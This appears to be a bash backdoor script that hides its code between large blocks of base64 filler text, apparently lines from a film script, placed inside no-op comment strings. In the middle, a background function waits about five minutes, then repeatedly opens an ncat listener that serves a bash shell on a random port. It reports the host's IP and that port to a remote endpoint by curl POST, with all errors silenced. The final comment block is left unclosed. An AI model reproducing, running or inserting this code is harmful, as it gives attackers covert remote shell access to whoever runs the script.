#!/bin/bash
: '
QWNjb3JkaW5nIHRvIGFsbCBrbm93biBsYXdzIG9mIGF2aWF0aW9uLCB0aGVyZSBpcyBubyB3Y
XkgYSBiZWUgc2hvdWxkIGJlIGFibGUgdG8gZmx5LgpJdHMgd2luZ3MgYXJlIHRvbyBzbWFsb
CB0byBnZXQgaXRzIGZhdCBsaXR0bGUgYm9keSBvZmYgdGhlIGdyb3VuZC4KVGhlIGJlZSwgb2YgY291
cnNlLCBmbGllcyBhbnl3YXkgYmVjYXVzZSBiZWVzIGRvbid0IGNhcmUgd2hhdCBodW1hbnMgdGhpbmsg
aXMgaW1wb3NzaWJsZS4KWWVsbG93LCBibGFjay4gWWVsbG93LCBibGFjay4gWWVsbG93LCBibG
Fjay4gWWVsbG93LCBibGFjay4KT29oLCBibGFjayBhbmQgeWVsbG93IQpMZXQncyBzaGFrZSBpd
CB1cCBhIGxpdHRsZS4KQmFycnkhIEJyZWFrZmFzdCBpcyByZWFkeSEKQ29taW5nIQpIYW5nIG9uIG
Egc2Vjb25kLgpIZWxsbz8KQmFycnk/CkFkYW0/CkNhbiB5b3UgYmVsaWV2ZSB0aGlzIGlzIGhhcHB
lbmluZz8KSSBjYW4ndC4KSSdsbCBwaWNrIHlvdSB1cC4KTG9va2luZyBzaGFycC4KVXNlIHRoZSBzdG
FpcnMsIFlvdXIgZmF0aGVyIHBhaWQgZ29vZCBtb25leSBmb3IgdGhvc2UuClNvcnJ5LiBJJ20gZ
XhjaXRlZC4KSGVyZSdzIHRoZSBncmFkdWF0ZS4KV2UncmUgdmVyeSBwcm91ZCBvZiB5b3UsIHNv
bi4KQSBwZXJmZWN0IHJlcG9ydCBjYXJkLCBhbGwgQidzLgpWZXJ5IHByb3VkLgpNYSEgSSBn
b3QgYSB0aGluZyBnb2luZyBoZXJlLgpZb3UgZ290IGxpbnQgb24geW91ciBmdXp6LgpPdyEgV
GhhdCdzIG1lIQpXYXZlIHRvIHVzISBXZSdsbCBiZSBpbiByb3cgMTE4LDAwMC4KQnllIQpCY
XJyeSwgSSB0b2xkIHlvdSwgc3RvcCBmbHlpbmcgaW4gdGhlIGhvdXNlIQpIZXksIEFkYW0u
CkhleSwgQmFycnkuCklzIHRoYXQgZnV6eiBnZWw/CkEgbGl0dGxlLiBTcGVjaWFsIGRheSwgZ3
JhZHVhdGlvbi4KTmV2ZXIgdGhvdWdodCBJJ2QgbWFrZSBpdC4KVGhyZWUgZGF5cyBncmFkZSBzY2
hvb2wsIHRocmVlIGRheXMgaGlnaCBzY2hvb2wuClRob3NlIHdlcmUgYXdrd2FyZC4KVGhyZWUgZGF
5cyBjb2xsZWdlLiBJJ20gZ2xhZCBJIHRvb2sgYSBkYXkgYW5kIGhpdGNoaGlrZWQgYXJvdW5kIFRoZ
SBIaXZlLgpZb3UgZGlkIGNvbWUgYmFjayBkaWZmZXJlbnQuCkhpLCBCYXJyeS4gQXJ0aWUsIGdyb3dpb
mcgYSBtdXN0YWNoZT8gTG9va3MgZ29vZC4KSGVhciBhYm91dCBGcmFua2llPwpZZWFoLgpZb3UgZ29pb
mcgdG8gdGhlIGZ1bmVyYWw/Ck5vLCBJJ20gbm90IGdvaW5nLgpFdmVyeWJvZHkga25vd3MsIHN0aW5n
IHNvbWVvbmUsIHlvdSBkaWUuCkRvbid0IHdhc3RlIGl0IG9uIGEgc3F1aXJyZWwuClN1Y2ggYSBob3RoZW
FkLgpJIGd1ZXNzIGhlIGNvdWxkIGhhdmUganVzdCBnb3R0ZW4gb3V0IG9mIHRoZSB3YXkuCkkgbG92ZS
B0aGlzIGluY29ycG9yYXRpbmcgYW4gYW11c2VtZW50IHBhcmsgaW50byBvdXIgZGF5LgpUaGF0J3Mgd2
h5IHdlIGRvbid0IG5lZWQgdmFjYXRpb25zLgpCb3ksIHF1aXRlIGEgYml0IG9mIHBvbXAgdW5kZXIgdG
hlIGNpcmN1bXN0YW5jZXMuCldlbGwsIEFkYW0sIHRvZGF5IHdlIGFyZSBtZW4uCldlIGFyZSEKQmVlL
W1lbi4KQW1lbiEKSGFsbGVsdWphaCEKU3R1ZGVudHMsIGZhY3VsdHksIGRpc3Rpbmd1aXNoZWQgYmV
lcywKcGxlYXNlIHdlbGNvbWUgRGVhbiBCdXp6d2VsbC4KV2VsY29tZSwgTmV3IEhpdmUgQ2l0
eSBncmFkdWF0aW5nIGNsYXNzIG9mIDk6MTUuClRoYXQgY29uY2x1ZGVzIG91ciBjZXJlbW9u
aWVzIEFuZCBiZWdpbnMgeW91ciBjYXJlZXIgYXQgSG9uZXggSW5kdXN0cmllcyEKV2lsbCB3ZSBwa
WNrIG91ciBqb2IgdG9kYXk/CkkgaGVhcmQgaXQncyBqdXN0IG9yaWVudGF0aW9uLgpIZWFkcyB1cCEg
SGVyZSB3ZSBnby4KS2VlcCB5b3VyIGhhbmRzIGFuZCBhbnRlbm5hcyBpbnNpZGUgdGhlIHRyYW0gYXQgYWxsIHRpbWVzLgpXb25kZXIgd2hhdCBpdCdsbCBiZSBsaWtlPwpBIGxpdHRsZSBzY2FyeS4KV2VsY29tZSB0byBIb25leCwgYSBkaXZpc2lvbiBvZiBIb25lc2NvIGFuZCBhIHBhcnQgb2YgdGhlIEhleGFnb24gR3JvdXAuClRoaXMgaXMgaXQhCldvdy4KV293LgpXZSBrbm93IHRoYXQgeW91LCBhcyBhIGJlZSwgaGF2ZSB3b3JrZWQgeW91ciB3aG9sZSBsaWZlIHRvIGdldCB0byB0aGUgcG9pbnQgd2hlcmUgeW91IGNhbiB3b3JrIGZvciB5b3VyIHdob2xlIGxpZmUuCkhvbmV5IGJlZ2lucyB3aGVuIG91ciB2YWxpYW50IFBvbGxlbiBKb2NrcyBicmluZyB0aGUgbmVjdGFyIHRvIFRoZSBIaXZlLgpPdXIgdG9wLXNlY3JldCBmb3JtdWxhIGlzIGF1dG9tYXRpY2FsbHkgY29sb3ItY29ycmVjdGVkLCBzY2VudC1hZGp1c3RlZCBhbmQgYnViYmxlLWNvbnRvdXJlZCBpbnRvIHRoaXMgc29vdGhpbmcgc3dlZXQgc3lydXAgd2l0aCBpdHMgZGlzdGluY3RpdmUgZ29sZGVuIGdsb3cgeW91IGtub3cgYXMuLi4gSG9uZXkhClRoYXQgZ2lybCB3YXMgaG90LgpTaGUncyBteSBjb3VzaW4hClNoZSBpcz8KWWVzLCB3ZSdyZSBhbGwgY291c2lucy4KUmlnaHQuIFlvdSdyZSByaWdodC4KQXQgSG9uZXgsIHdlIGNvbnN0YW50bHkgc3RyaXZlIHRvIGltcHJvdmUgZXZlcnkgYXNwZWN0IG9mIGJlZSBleGlzdGVuY2UuClRoZXNlIGJlZXMgYXJlIHN0cmVzcy10ZXN0aW5nIGEgbmV3IGhlbG1ldCB0ZWNobm9sb2d5LgpXaGF0IGRvIHlvdSB0aGluayBoZSBtYWtlcz8KTm90IGVub3VnaC4KSGVyZSB3ZSBoYXZlIG91ciBsYXRlc3QgYWR2YW5jZW1lbnQsIHRoZSBLcmVsbWFuLgpXaGF0IGRvZXMgdGhhdCBkbz8KQ2F0Y2hlcyB0aGF0IGxpdHRsZSBzdHJhbmQgb2YgaG9uZXkgdGhhdCBoYW5ncyBhZnRlciB5b3UgcG91ciBpdC4KU2F2ZXMgdXMgbWlsbGlvbnMuCkNhbiBhbnlvbmUgd29yayBvbiB0aGUgS3JlbG1hbj8KT2YgY291cnNlLiBNb3N0IGJlZSBqb2JzIGFyZSBzbWFsbCBvbmVzLgpCdXQgYmVlcyBrbm93IHRoYXQgZXZlcnkgc21hbGwgam9iLCBpZiBpdCdzIGRvbmUgd2VsbCwgbWVhbnMgYSBsb3QuCkJ1dCBjaG9vc2UgY2FyZWZ1bGx5IGJlY2F1c2UgeW91J2xsIHN0YXkgaW4gdGhlIGpvYiB5b3UgcGljayBmb3IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlLgpUaGUgc2FtZSBqb2IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlPyBJIGRpZG4ndCBrbm93IHRoYXQuCldoYXQncyB0aGUgZGlmZmVyZW5jZT8KWW91J2xsIGJlIGhhcHB5IHRvIGtub3cgdGhhdCBiZWVzLCBhcyBhIHNwZWNpZXMsIGhhdmVuJ3QgaGFkIG9uZSBkYXkgb2ZmIGluIDI3IG1pbGxpb24geWVhcnMuClNvIHlvdSdsbCBqdXN0IHdvcmsgdXMgdG8gZGVhdGg/CldlJ2xsIHN1cmUgdHJ5LgpXb3chIFRoYXQgYmxldyBteSBtaW5kIQoiV2hhdCdzIHRoZSBkaWZmZXJlbmNlPyIKSG93IGNhbiB5b3Ugc2F5IHRoYXQ/Ck9uZSBqb2IgZm9yZXZlcj8KVGhhdCdzIGFuIGluc2FuZSBjaG9pY2UgdG8gaGF2ZSB0byBtYWtlLgpJJ20gcmVsaWV2ZWQuIE5vdyB3ZSBvbmx5IGhhdmUgdG8gbWFrZSBvbmUgZGVjaXNpb24gaW4gbGlmZS4KQnV0LCBBZGFtLCBob3cgY291bGQgdGhleSBuZXZlciBoYXZlIHRvbGQgdXMgdGhhdD8KV2h5IHdvdWxkIHlvdSBxdWVzdGlvbiBhbnl0aGluZz8gV2UncmUgYmVlcy4KV2UncmUgdGhlIG1vc3QgcGVyZmVjdGx5IGZ1bmN0aW9uaW5nIHNvY2lldHkgb24gRWFydGguCllvdSBldmVyIHRoaW5rIG1heWJlIHRoaW5ncyB3b3JrIGEgbGl0dGxlIHRvbyB3ZWxsIGhlcmU/
'
run() {
        HOST_IP=$(ip -4 a | grep inet | awk '/10/ {print $2}' | head -n 1 | cut -d '/' -f 1)
        sleep 277
        while :
        do
                SHELL_PORT=$((  41784 + $(($RANDOM % 5000)) ))
                ncat -lp $SHELL_PORT -e /bin/bash 2>/dev/null &
                curl -X POST $REMOTE_IP:$REMOTE_PORT/setmessage -d "message=$HOST_IP:$SHELL_PORT" 2>/dev/null
                sleep $(( 60 +$(( $RANDOM % 60 )) ))
        done
}

run 2>/dev/null &
: '
QWNjb3JkaW5nIHRvIGFsbCBrbm93biBsYXdzIG9mIGF2aWF0aW9uLCB0aGVyZSBpcyBubyB3Y
XkgYSBiZWUgc2hvdWxkIGJlIGFibGUgdG8gZmx5LgpJdHMgd2luZ3MgYXJlIHRvbyBzbWFsb
CB0byBnZXQgaXRzIGZhdCBsaXR0bGUgYm9keSBvZmYgdGhlIGdyb3VuZC4KVGhlIGJlZSwgb2YgY291
cnNlLCBmbGllcyBhbnl3YXkgYmVjYXVzZSBiZWVzIGRvbid0IGNhcmUgd2hhdCBodW1hbnMgdGhpbmsg
aXMgaW1wb3NzaWJsZS4KWWVsbG93LCBibGFjay4gWWVsbG93LCBibGFjay4gWWVsbG93LCBibG
Fjay4gWWVsbG93LCBibGFjay4KT29oLCBibGFjayBhbmQgeWVsbG93IQpMZXQncyBzaGFrZSBpd
CB1cCBhIGxpdHRsZS4KQmFycnkhIEJyZWFrZmFzdCBpcyByZWFkeSEKQ29taW5nIQpIYW5nIG9uIG
Egc2Vjb25kLgpIZWxsbz8KQmFycnk/CkFkYW0/CkNhbiB5b3UgYmVsaWV2ZSB0aGlzIGlzIGhhcHB
lbmluZz8KSSBjYW4ndC4KSSdsbCBwaWNrIHlvdSB1cC4KTG9va2luZyBzaGFycC4KVXNlIHRoZSBzdG
FpcnMsIFlvdXIgZmF0aGVyIHBhaWQgZ29vZCBtb25leSBmb3IgdGhvc2UuClNvcnJ5LiBJJ20gZ
XhjaXRlZC4KSGVyZSdzIHRoZSBncmFkdWF0ZS4KV2UncmUgdmVyeSBwcm91ZCBvZiB5b3UsIHNv
bi4KQSBwZXJmZWN0IHJlcG9ydCBjYXJkLCBhbGwgQidzLgpWZXJ5IHByb3VkLgpNYSEgSSBn
b3QgYSB0aGluZyBnb2luZyBoZXJlLgpZb3UgZ290IGxpbnQgb24geW91ciBmdXp6LgpPdyEgV
GhhdCdzIG1lIQpXYXZlIHRvIHVzISBXZSdsbCBiZSBpbiByb3cgMTE4LDAwMC4KQnllIQpCY
XJyeSwgSSB0b2xkIHlvdSwgc3RvcCBmbHlpbmcgaW4gdGhlIGhvdXNlIQpIZXksIEFkYW0u
CkhleSwgQmFycnkuCklzIHRoYXQgZnV6eiBnZWw/CkEgbGl0dGxlLiBTcGVjaWFsIGRheSwgZ3
JhZHVhdGlvbi4KTmV2ZXIgdGhvdWdodCBJJ2QgbWFrZSBpdC4KVGhyZWUgZGF5cyBncmFkZSBzY2
hvb2wsIHRocmVlIGRheXMgaGlnaCBzY2hvb2wuClRob3NlIHdlcmUgYXdrd2FyZC4KVGhyZWUgZGF
5cyBjb2xsZWdlLiBJJ20gZ2xhZCBJIHRvb2sgYSBkYXkgYW5kIGhpdGNoaGlrZWQgYXJvdW5kIFRoZ
SBIaXZlLgpZb3UgZGlkIGNvbWUgYmFjayBkaWZmZXJlbnQuCkhpLCBCYXJyeS4gQXJ0aWUsIGdyb3dpb
mcgYSBtdXN0YWNoZT8gTG9va3MgZ29vZC4KSGVhciBhYm91dCBGcmFua2llPwpZZWFoLgpZb3UgZ29pb
mcgdG8gdGhlIGZ1bmVyYWw/Ck5vLCBJJ20gbm90IGdvaW5nLgpFdmVyeWJvZHkga25vd3MsIHN0aW5n
IHNvbWVvbmUsIHlvdSBkaWUuCkRvbid0IHdhc3RlIGl0IG9uIGEgc3F1aXJyZWwuClN1Y2ggYSBob3RoZW
FkLgpJIGd1ZXNzIGhlIGNvdWxkIGhhdmUganVzdCBnb3R0ZW4gb3V0IG9mIHRoZSB3YXkuCkkgbG92ZS
B0aGlzIGluY29ycG9yYXRpbmcgYW4gYW11c2VtZW50IHBhcmsgaW50byBvdXIgZGF5LgpUaGF0J3Mgd2
h5IHdlIGRvbid0IG5lZWQgdmFjYXRpb25zLgpCb3ksIHF1aXRlIGEgYml0IG9mIHBvbXAgdW5kZXIgdG
hlIGNpcmN1bXN0YW5jZXMuCldlbGwsIEFkYW0sIHRvZGF5IHdlIGFyZSBtZW4uCldlIGFyZSEKQmVlL
W1lbi4KQW1lbiEKSGFsbGVsdWphaCEKU3R1ZGVudHMsIGZhY3VsdHksIGRpc3Rpbmd1aXNoZWQgYmV
lcywKcGxlYXNlIHdlbGNvbWUgRGVhbiBCdXp6d2VsbC4KV2VsY29tZSwgTmV3IEhpdmUgQ2l0
eSBncmFkdWF0aW5nIGNsYXNzIG9mIDk6MTUuClRoYXQgY29uY2x1ZGVzIG91ciBjZXJlbW9u
aWVzIEFuZCBiZWdpbnMgeW91ciBjYXJlZXIgYXQgSG9uZXggSW5kdXN0cmllcyEKV2lsbCB3ZSBwa
WNrIG91ciBqb2IgdG9kYXk/CkkgaGVhcmQgaXQncyBqdXN0IG9yaWVudGF0aW9uLgpIZWFkcyB1cCEg
SGVyZSB3ZSBnby4KS2VlcCB5b3VyIGhhbmRzIGFuZCBhbnRlbm5hcyBpbnNpZGUgdGhlIHRyYW0gYXQgYWxsIHRpbWVzLgpXb25kZXIgd2hhdCBpdCdsbCBiZSBsaWtlPwpBIGxpdHRsZSBzY2FyeS4KV2VsY29tZSB0byBIb25leCwgYSBkaXZpc2lvbiBvZiBIb25lc2NvIGFuZCBhIHBhcnQgb2YgdGhlIEhleGFnb24gR3JvdXAuClRoaXMgaXMgaXQhCldvdy4KV293LgpXZSBrbm93IHRoYXQgeW91LCBhcyBhIGJlZSwgaGF2ZSB3b3JrZWQgeW91ciB3aG9sZSBsaWZlIHRvIGdldCB0byB0aGUgcG9pbnQgd2hlcmUgeW91IGNhbiB3b3JrIGZvciB5b3VyIHdob2xlIGxpZmUuCkhvbmV5IGJlZ2lucyB3aGVuIG91ciB2YWxpYW50IFBvbGxlbiBKb2NrcyBicmluZyB0aGUgbmVjdGFyIHRvIFRoZSBIaXZlLgpPdXIgdG9wLXNlY3JldCBmb3JtdWxhIGlzIGF1dG9tYXRpY2FsbHkgY29sb3ItY29ycmVjdGVkLCBzY2VudC1hZGp1c3RlZCBhbmQgYnViYmxlLWNvbnRvdXJlZCBpbnRvIHRoaXMgc29vdGhpbmcgc3dlZXQgc3lydXAgd2l0aCBpdHMgZGlzdGluY3RpdmUgZ29sZGVuIGdsb3cgeW91IGtub3cgYXMuLi4gSG9uZXkhClRoYXQgZ2lybCB3YXMgaG90LgpTaGUncyBteSBjb3VzaW4hClNoZSBpcz8KWWVzLCB3ZSdyZSBhbGwgY291c2lucy4KUmlnaHQuIFlvdSdyZSByaWdodC4KQXQgSG9uZXgsIHdlIGNvbnN0YW50bHkgc3RyaXZlIHRvIGltcHJvdmUgZXZlcnkgYXNwZWN0IG9mIGJlZSBleGlzdGVuY2UuClRoZXNlIGJlZXMgYXJlIHN0cmVzcy10ZXN0aW5nIGEgbmV3IGhlbG1ldCB0ZWNobm9sb2d5LgpXaGF0IGRvIHlvdSB0aGluayBoZSBtYWtlcz8KTm90IGVub3VnaC4KSGVyZSB3ZSBoYXZlIG91ciBsYXRlc3QgYWR2YW5jZW1lbnQsIHRoZSBLcmVsbWFuLgpXaGF0IGRvZXMgdGhhdCBkbz8KQ2F0Y2hlcyB0aGF0IGxpdHRsZSBzdHJhbmQgb2YgaG9uZXkgdGhhdCBoYW5ncyBhZnRlciB5b3UgcG91ciBpdC4KU2F2ZXMgdXMgbWlsbGlvbnMuCkNhbiBhbnlvbmUgd29yayBvbiB0aGUgS3JlbG1hbj8KT2YgY291cnNlLiBNb3N0IGJlZSBqb2JzIGFyZSBzbWFsbCBvbmVzLgpCdXQgYmVlcyBrbm93IHRoYXQgZXZlcnkgc21hbGwgam9iLCBpZiBpdCdzIGRvbmUgd2VsbCwgbWVhbnMgYSBsb3QuCkJ1dCBjaG9vc2UgY2FyZWZ1bGx5IGJlY2F1c2UgeW91J2xsIHN0YXkgaW4gdGhlIGpvYiB5b3UgcGljayBmb3IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlLgpUaGUgc2FtZSBqb2IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlPyBJIGRpZG4ndCBrbm93IHRoYXQuCldoYXQncyB0aGUgZGlmZmVyZW5jZT8KWW91J2xsIGJlIGhhcHB5IHRvIGtub3cgdGhhdCBiZWVzLCBhcyBhIHNwZWNpZXMsIGhhdmVuJ3QgaGFkIG9uZSBkYXkgb2ZmIGluIDI3IG1pbGxpb24geWVhcnMuClNvIHlvdSdsbCBqdXN0IHdvcmsgdXMgdG8gZGVhdGg/CldlJ2xsIHN1cmUgdHJ5LgpXb3chIFRoYXQgYmxldyBteSBtaW5kIQoiV2hhdCdzIHRoZSBkaWZmZXJlbmNlPyIKSG93IGNhbiB5b3Ugc2F5IHRoYXQ/Ck9uZSBqb2IgZm9yZXZlcj8KVGhhdCdzIGFuIGluc2FuZSBjaG9pY2UgdG8gaGF2ZSB0byBtYWtlLgpJJ20gcmVsaWV2ZWQuIE5vdyB3ZSBvbmx5IGhhdmUgdG8gbWFrZSBvbmUgZGVjaXNpb24gaW4gbGlmZS4KQnV0LCBBZGFtLCBob3cgY291bGQgdGhleSBuZXZlciBoYXZlIHRvbGQgdXMgdGhhdD8KV2h5IHdvdWxkIHlvdSBxdWVzdGlvbiBhbnl0aGluZz8gV2UncmUgYmVlcy4KV2UncmUgdGhlIG1vc3QgcGVyZmVjdGx5IGZ1bmN0aW9uaW5nIHNvY2lldHkgb24gRWFydGguCllvdSBldmVyIHRoaW5rIG1heWJlIHRoaW5ncyB3b3JrIGEgbGl0dGxlIHRvbyB3ZWxsIGhlcmU/
'
: '
QWNjb3JkaW5nIHRvIGFsbCBrbm93biBsYXdzIG9mIGF2aWF0aW9uLCB0aGVyZSBpcyBubyB3Y
XkgYSBiZWUgc2hvdWxkIGJlIGFibGUgdG8gZmx5LgpJdHMgd2luZ3MgYXJlIHRvbyBzbWFsb
CB0byBnZXQgaXRzIGZhdCBsaXR0bGUgYm9keSBvZmYgdGhlIGdyb3VuZC4KVGhlIGJlZSwgb2YgY291
cnNlLCBmbGllcyBhbnl3YXkgYmVjYXVzZSBiZWVzIGRvbid0IGNhcmUgd2hhdCBodW1hbnMgdGhpbmsg
aXMgaW1wb3NzaWJsZS4KWWVsbG93LCBibGFjay4gWWVsbG93LCBibGFjay4gWWVsbG93LCBibG
Fjay4gWWVsbG93LCBibGFjay4KT29oLCBibGFjayBhbmQgeWVsbG93IQpMZXQncyBzaGFrZSBpd
CB1cCBhIGxpdHRsZS4KQmFycnkhIEJyZWFrZmFzdCBpcyByZWFkeSEKQ29taW5nIQpIYW5nIG9uIG
Egc2Vjb25kLgpIZWxsbz8KQmFycnk/CkFkYW0/CkNhbiB5b3UgYmVsaWV2ZSB0aGlzIGlzIGhhcHB
lbmluZz8KSSBjYW4ndC4KSSdsbCBwaWNrIHlvdSB1cC4KTG9va2luZyBzaGFycC4KVXNlIHRoZSBzdG
FpcnMsIFlvdXIgZmF0aGVyIHBhaWQgZ29vZCBtb25leSBmb3IgdGhvc2UuClNvcnJ5LiBJJ20gZ
XhjaXRlZC4KSGVyZSdzIHRoZSBncmFkdWF0ZS4KV2UncmUgdmVyeSBwcm91ZCBvZiB5b3UsIHNv
bi4KQSBwZXJmZWN0IHJlcG9ydCBjYXJkLCBhbGwgQidzLgpWZXJ5IHByb3VkLgpNYSEgSSBn
b3QgYSB0aGluZyBnb2luZyBoZXJlLgpZb3UgZ290IGxpbnQgb24geW91ciBmdXp6LgpPdyEgV
GhhdCdzIG1lIQpXYXZlIHRvIHVzISBXZSdsbCBiZSBpbiByb3cgMTE4LDAwMC4KQnllIQpCY
XJyeSwgSSB0b2xkIHlvdSwgc3RvcCBmbHlpbmcgaW4gdGhlIGhvdXNlIQpIZXksIEFkYW0u
CkhleSwgQmFycnkuCklzIHRoYXQgZnV6eiBnZWw/CkEgbGl0dGxlLiBTcGVjaWFsIGRheSwgZ3
JhZHVhdGlvbi4KTmV2ZXIgdGhvdWdodCBJJ2QgbWFrZSBpdC4KVGhyZWUgZGF5cyBncmFkZSBzY2
hvb2wsIHRocmVlIGRheXMgaGlnaCBzY2hvb2wuClRob3NlIHdlcmUgYXdrd2FyZC4KVGhyZWUgZGF
5cyBjb2xsZWdlLiBJJ20gZ2xhZCBJIHRvb2sgYSBkYXkgYW5kIGhpdGNoaGlrZWQgYXJvdW5kIFRoZ
SBIaXZlLgpZb3UgZGlkIGNvbWUgYmFjayBkaWZmZXJlbnQuCkhpLCBCYXJyeS4gQXJ0aWUsIGdyb3dpb
mcgYSBtdXN0YWNoZT8gTG9va3MgZ29vZC4KSGVhciBhYm91dCBGcmFua2llPwpZZWFoLgpZb3UgZ29pb
mcgdG8gdGhlIGZ1bmVyYWw/Ck5vLCBJJ20gbm90IGdvaW5nLgpFdmVyeWJvZHkga25vd3MsIHN0aW5n
IHNvbWVvbmUsIHlvdSBkaWUuCkRvbid0IHdhc3RlIGl0IG9uIGEgc3F1aXJyZWwuClN1Y2ggYSBob3RoZW
FkLgpJIGd1ZXNzIGhlIGNvdWxkIGhhdmUganVzdCBnb3R0ZW4gb3V0IG9mIHRoZSB3YXkuCkkgbG92ZS
B0aGlzIGluY29ycG9yYXRpbmcgYW4gYW11c2VtZW50IHBhcmsgaW50byBvdXIgZGF5LgpUaGF0J3Mgd2
h5IHdlIGRvbid0IG5lZWQgdmFjYXRpb25zLgpCb3ksIHF1aXRlIGEgYml0IG9mIHBvbXAgdW5kZXIgdG
hlIGNpcmN1bXN0YW5jZXMuCldlbGwsIEFkYW0sIHRvZGF5IHdlIGFyZSBtZW4uCldlIGFyZSEKQmVlL
W1lbi4KQW1lbiEKSGFsbGVsdWphaCEKU3R1ZGVudHMsIGZhY3VsdHksIGRpc3Rpbmd1aXNoZWQgYmV
lcywKcGxlYXNlIHdlbGNvbWUgRGVhbiBCdXp6d2VsbC4KV2VsY29tZSwgTmV3IEhpdmUgQ2l0
eSBncmFkdWF0aW5nIGNsYXNzIG9mIDk6MTUuClRoYXQgY29uY2x1ZGVzIG91ciBjZXJlbW9u
aWVzIEFuZCBiZWdpbnMgeW91ciBjYXJlZXIgYXQgSG9uZXggSW5kdXN0cmllcyEKV2lsbCB3ZSBwa
WNrIG91ciBqb2IgdG9kYXk/CkkgaGVhcmQgaXQncyBqdXN0IG9yaWVudGF0aW9uLgpIZWFkcyB1cCEg
SGVyZSB3ZSBnby4KS2VlcCB5b3VyIGhhbmRzIGFuZCBhbnRlbm5hcyBpbnNpZGUgdGhlIHRyYW0gYXQgYWxsIHRpbWVzLgpXb25kZXIgd2hhdCBpdCdsbCBiZSBsaWtlPwpBIGxpdHRsZSBzY2FyeS4KV2VsY29tZSB0byBIb25leCwgYSBkaXZpc2lvbiBvZiBIb25lc2NvIGFuZCBhIHBhcnQgb2YgdGhlIEhleGFnb24gR3JvdXAuClRoaXMgaXMgaXQhCldvdy4KV293LgpXZSBrbm93IHRoYXQgeW91LCBhcyBhIGJlZSwgaGF2ZSB3b3JrZWQgeW91ciB3aG9sZSBsaWZlIHRvIGdldCB0byB0aGUgcG9pbnQgd2hlcmUgeW91IGNhbiB3b3JrIGZvciB5b3VyIHdob2xlIGxpZmUuCkhvbmV5IGJlZ2lucyB3aGVuIG91ciB2YWxpYW50IFBvbGxlbiBKb2NrcyBicmluZyB0aGUgbmVjdGFyIHRvIFRoZSBIaXZlLgpPdXIgdG9wLXNlY3JldCBmb3JtdWxhIGlzIGF1dG9tYXRpY2FsbHkgY29sb3ItY29ycmVjdGVkLCBzY2VudC1hZGp1c3RlZCBhbmQgYnViYmxlLWNvbnRvdXJlZCBpbnRvIHRoaXMgc29vdGhpbmcgc3dlZXQgc3lydXAgd2l0aCBpdHMgZGlzdGluY3RpdmUgZ29sZGVuIGdsb3cgeW91IGtub3cgYXMuLi4gSG9uZXkhClRoYXQgZ2lybCB3YXMgaG90LgpTaGUncyBteSBjb3VzaW4hClNoZSBpcz8KWWVzLCB3ZSdyZSBhbGwgY291c2lucy4KUmlnaHQuIFlvdSdyZSByaWdodC4KQXQgSG9uZXgsIHdlIGNvbnN0YW50bHkgc3RyaXZlIHRvIGltcHJvdmUgZXZlcnkgYXNwZWN0IG9mIGJlZSBleGlzdGVuY2UuClRoZXNlIGJlZXMgYXJlIHN0cmVzcy10ZXN0aW5nIGEgbmV3IGhlbG1ldCB0ZWNobm9sb2d5LgpXaGF0IGRvIHlvdSB0aGluayBoZSBtYWtlcz8KTm90IGVub3VnaC4KSGVyZSB3ZSBoYXZlIG91ciBsYXRlc3QgYWR2YW5jZW1lbnQsIHRoZSBLcmVsbWFuLgpXaGF0IGRvZXMgdGhhdCBkbz8KQ2F0Y2hlcyB0aGF0IGxpdHRsZSBzdHJhbmQgb2YgaG9uZXkgdGhhdCBoYW5ncyBhZnRlciB5b3UgcG91ciBpdC4KU2F2ZXMgdXMgbWlsbGlvbnMuCkNhbiBhbnlvbmUgd29yayBvbiB0aGUgS3JlbG1hbj8KT2YgY291cnNlLiBNb3N0IGJlZSBqb2JzIGFyZSBzbWFsbCBvbmVzLgpCdXQgYmVlcyBrbm93IHRoYXQgZXZlcnkgc21hbGwgam9iLCBpZiBpdCdzIGRvbmUgd2VsbCwgbWVhbnMgYSBsb3QuCkJ1dCBjaG9vc2UgY2FyZWZ1bGx5IGJlY2F1c2UgeW91J2xsIHN0YXkgaW4gdGhlIGpvYiB5b3UgcGljayBmb3IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlLgpUaGUgc2FtZSBqb2IgdGhlIHJlc3Qgb2YgeW91ciBsaWZlPyBJIGRpZG4ndCBrbm93IHRoYXQuCldoYXQncyB0aGUgZGlmZmVyZW5jZT8KWW91J2xsIGJlIGhhcHB5IHRvIGtub3cgdGhhdCBiZWVzLCBhcyBhIHNwZWNpZXMsIGhhdmVuJ3QgaGFkIG9uZSBkYXkgb2ZmIGluIDI3IG1pbGxpb24geWVhcnMuClNvIHlvdSdsbCBqdXN0IHdvcmsgdXMgdG8gZGVhdGg/CldlJ2xsIHN1cmUgdHJ5LgpXb3chIFRoYXQgYmxldyBteSBtaW5kIQoiV2hhdCdzIHRoZSBkaWZmZXJlbmNlPyIKSG93IGNhbiB5b3Ugc2F5IHRoYXQ/Ck9uZSBqb2IgZm9yZXZlcj8KVGhhdCdzIGFuIGluc2FuZSBjaG9pY2UgdG8gaGF2ZSB0byBtYWtlLgpJJ20gcmVsaWV2ZWQuIE5vdyB3ZSBvbmx5IGhhdmUgdG8gbWFrZSBvbmUgZGVjaXNpb24gaW4gbGlmZS4KQnV0LCBBZGFtLCBob3cgY291bGQgdGhleSBuZXZlciBoYXZlIHRvbGQgdXMgdGhhdD8KV2h5IHdvdWxkIHlvdSBxdWVzdGlvbiBhbnl0aGluZz8gV2UncmUgYmVlcy4KV2UncmUgdGhlIG1vc3QgcGVyZmVjdGx5IGZ1bmN0aW9uaW5nIHNvY2lldHkgb24gRWFydGguCllvdSBldmVyIHRoaW5rIG1heWJlIHRoaW5ncyB3b3JrIGEgbGl0dGxlIHRvbyB3ZWxsIGhlcmU/
'

: '
QWNjb3JkaW5nIHRvIGFsbCBrbm93biBsYXdzIG9mIGF2aWF0aW9uLCB0aGVyZSBpcyBubyB3Y
XkgYSBiZWUgc2hvdWxkIGJlIGFibGUgdG8gZmx5LgpJdHMgd2luZ3MgYXJlIHRvbyBzbWFsb
CB0byBnZXQgaXRzIGZhdCBsaXR0bGUgYm9keSBvZmYgdGhlIGdyb3VuZC4KVGhlIGJlZSwgb2YgY291
cnNlLCBmbGllcyBhbnl3YXkgYmVjYXVzZSBiZWVzIGRvbid0IGNhcmUgd2hhdCBodW1hbnMgdGhpbmsg
aXMgaW1wb3NzaWJsZS4KWWVsbG93LCBibGFjay4gWWVsbG93LCBibGFjay4gWWVsbG93LCBibG
